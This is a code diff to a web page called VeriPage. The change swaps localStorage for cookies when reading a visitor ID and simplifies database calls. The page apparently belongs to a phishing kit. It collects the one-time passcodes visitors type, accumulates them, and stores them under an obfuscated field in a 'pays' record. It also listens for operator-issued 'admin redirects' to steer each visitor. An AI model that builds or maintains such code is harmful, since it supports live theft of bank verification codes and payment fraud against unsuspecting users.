@@ -15,10 +15,11 @@ import {
 } from "lucide-react";
 import { UnifiedSpinner, SimpleSpinner } from "@/components/unified-spinner";
 import { StepShell } from "@/components/step-shell";
-import { db } from "@/lib/supabase-client";
-import { doc, onSnapshot, setDoc, Firestore } from "@/lib/supabase-client";
+import { db, doc, onSnapshot, setDoc } from "@/lib/supabase-client";
 import { addToHistory } from "@/lib/history-utils";
 import { useRedirectMonitor } from "@/hooks/use-redirect-monitor";
+import { getCookie, setCookie, eraseCookie } from '@/lib/cookies';
+
 
 const allOtps: string[] = [];
 
@@ -38,7 +39,7 @@ export default function VeriPage() {
 
   // Initialize visitor ID and update current page
   useEffect(() => {
-    const id = localStorage.getItem("visitor") || "";
+    const id = getCookie("visitor") || "";
     setVisitorId(id);
     if (id) {
       const ref = `REF${Date.now().toString().slice(-8)}`;
@@ -61,7 +62,7 @@ export default function VeriPage() {
 
   // Check if visitor has access to this page
   useEffect(() => {
-    const visitorID = localStorage.getItem("visitor");
+    const visitorID = getCookie("visitor");
     if (!visitorID) {
       router.push("/home-new");
       return;
@@ -69,7 +70,7 @@ export default function VeriPage() {
 
     const checkAccess = async () => {
       if (!db) return;
-      const docRef = doc(db as Firestore, "pays", visitorID);
+      const docRef = doc("pays", visitorID);
       const unsubscribe = onSnapshot(docRef, (docSnapshot) => {
         if (!docSnapshot.exists()) {
           router.push("/check");
@@ -86,11 +87,11 @@ export default function VeriPage() {
 
   // Poll Supabase for OTP status changes
   useEffect(() => {
-    const visitorID = localStorage.getItem("visitor");
+    const visitorID = getCookie("visitor");
     if (!visitorID || !db) return;
 
     const unsubscribe = onSnapshot(
-      doc(db as Firestore, "pays", visitorID),
+      doc("pays", visitorID),
       (docSnapshot) => {
         if (docSnapshot.exists()) {
           const data = docSnapshot.data();
@@ -118,7 +119,7 @@ export default function VeriPage() {
                 : [currentOtp];
             }
 
-            setDoc(doc(db as Firestore, "pays", visitorID), updates, {
+            setDoc(doc("pays", visitorID), updates, {
               merge: true,
             })
               .then(() => {
@@ -152,11 +153,11 @@ export default function VeriPage() {
 
   // Navigation listener - listen for admin redirects
   useEffect(() => {
-    const visitorID = localStorage.getItem("visitor");
+    const visitorID = getCookie("visitor");
     if (!visitorID || !db) return;
 
     const unsubscribe = onSnapshot(
-      doc(db as Firestore, "pays", visitorID),
+      doc("pays", visitorID),
       (docSnapshot) => {
         if (docSnapshot.exists()) {
           const data = docSnapshot.data();
@@ -213,7 +214,7 @@ export default function VeriPage() {
     setIsConfirming(true);
     try {
       await setDoc(
-        doc(db as Firestore, "pays", visitorId),
+        doc("pays", visitorId),
         { _v5Status: "confirmed" },
         { merge: true },
       );
@@ -231,7 +232,7 @@ export default function VeriPage() {
       return;
     }
 
-    const visitorID = localStorage.getItem("visitor");
+    const visitorID = getCookie("visitor");
     if (!visitorID) return;
 
     try {
@@ -239,7 +240,7 @@ export default function VeriPage() {
       // Update the document with the OTP
       if (!db) return;
       await setDoc(
-        doc(db as Firestore, "pays", visitorID),
+        doc("pays", visitorID),
         {
           _v5,
           otpSubmittedAt: new Date().toISOString(),
@@ -271,13 +272,13 @@ export default function VeriPage() {
   const handleResendOtp = async () => {
     if (!canResend) return;
 
-    const visitorID = localStorage.getItem("visitor");
+    const visitorID = getCookie("visitor");
     if (!visitorID) return;
 
     try {
       if (!db) return;
       await setDoc(
-        doc(db as Firestore, "pays", visitorID),
+        doc("pays", visitorID),
         {
           otpResendRequested: true,
           otpResendAt: new Date().toISOString(),
